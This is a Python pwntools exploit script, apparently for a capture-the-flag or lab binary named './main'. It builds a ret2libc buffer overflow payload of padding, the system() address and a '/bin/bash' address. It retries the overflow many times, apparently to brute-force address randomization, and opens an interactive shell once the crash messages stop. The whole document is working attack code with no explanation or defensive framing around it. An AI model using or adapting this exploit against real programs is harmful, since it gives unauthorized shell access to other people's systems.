#!/usr/bin/env python
from pwn import *
import time
import locations

def hexify(hex_number):
    return chr(int("0x" + hex_number,16))

def reverse(add):
    stack = []
    for x in range(0,4):
        stack.append(hexify(add[2+x*2:4+x*2:]))
    r = ''
    for x in range(0,4):
        r += stack.pop()
    return  r

system_address = reverse(locations.system)
binbash_address = reverse(locations.binbash)

bad_words = ['glibc','stack smashing','Assertion']

for x in range(0,255*5):
    io = process('./main')
    padding = "A"*76
    exploit = padding + system_address + "A"*4 + binbash_address

    io.sendline(exploit)
    io.sendline("ls")
    buff = io.recvline()
    buff = io.recvline()
    if io.can_recv():
        a = io.recvline()
        print("A", a)
        found_bad_word = False
        for bad_word in bad_words:
            if bad_word in a:
                found_bad_word = True

        if found_bad_word is False:
            io.interactive()
            break
    io.close()

